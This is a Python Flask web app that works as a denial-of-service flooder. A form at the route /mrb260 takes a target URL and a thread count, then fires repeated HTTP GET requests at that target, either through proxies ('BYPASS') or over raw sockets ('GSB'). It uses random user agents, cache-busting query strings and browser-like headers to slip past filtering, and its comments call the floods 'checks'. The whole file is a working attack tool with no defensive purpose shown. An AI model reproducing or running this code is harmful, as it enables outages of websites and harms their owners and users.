from flask import Flask, request, render_template, jsonify
import threading
import random
from contextlib import suppress
from requests import Session
from urllib.request import ProxyHandler, build_opener, urlopen, Request
from user_agent import generate_user_agent

app = Flask(__name__)

# Global variables for tracking requests and bytes sent
REQUESTS_SENT = 0
BYTES_SEND = 0

class ProxyTools:
    class Random:
        @staticmethod
        def rand_str(length):
            """Generate a random string of fixed length."""
            import string
            return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

class Tools:
    @staticmethod
    def sizeOfRequest(response):
        """Calculate the size of the request in bytes."""
        return len(response.content)

    @staticmethod
    def safe_close(session):
        """Safely close a session or connection."""
        if session:
            try:
                session.close()
            except:
                pass

    @staticmethod
    def send(socket, payload):
        """Send raw payload over a socket."""
        socket.sendall(payload)

class Target:
    def __init__(self, url):
        self.url = url

    @property
    def human_repr(self):
        """Human-readable representation of the target."""
        return self.url

    @property
    def raw_path_qs(self):
        """Raw path and query string of the target."""
        from urllib.parse import urlparse
        parsed = urlparse(self.url)
        return parsed.path + ('?' + parsed.query if parsed.query else '')

    @property
    def authority(self):
        """Authority part of the URL (host:port)."""
        from urllib.parse import urlparse
        parsed = urlparse(self.url)
        return parsed.netloc

class RequestHandler:
    def __init__(self, target, proxies=None, rpc=10, req_type="GET"):
        self._target = Target(target)
        self._proxies = proxies
        self._rpc = rpc
        self._req_type = req_type
        self.randHeadercontent = "User-Agent: " + generate_user_agent() + "\r\n"

    def BYPASS(self):
        """Bypass restrictions using a session and optional proxies."""
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = random.choice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr, proxies=pro) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def GSB(self):
        """Send raw HTTP payloads to the target."""
        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                           self._target.raw_path_qs,
                                                           ProxyTools.Random.rand_str(6)) +
                             "Host: %s\r\n" % self._target.authority +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: Keep-Alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def open_connection(self):
        """Open a raw socket connection to the target."""
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self._target.authority.split(':')[0], 80))
        return s

@app.route("/", methods=["GET"])
def home():
    return render_template("home.html")

@app.route("/mrb260", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        url = request.form.get("url")
        check_type = request.form.get("check_type")  # "proxy" or "no_proxy"
        num_threads = int(request.form.get("num_threads", 10))  # Number of concurrent checks

        if not url:
            return jsonify({"error": "Please enter a URL!"})

        result = []
        threads = []
        for _ in range(num_threads):
            handler = RequestHandler(url, req_type="GET")
            if check_type == "proxy":
                thread = threading.Thread(target=handler.BYPASS)
            else:
                thread = threading.Thread(target=handler.GSB)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        return jsonify({"requests_sent": REQUESTS_SENT, "bytes_sent": BYTES_SEND})

    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
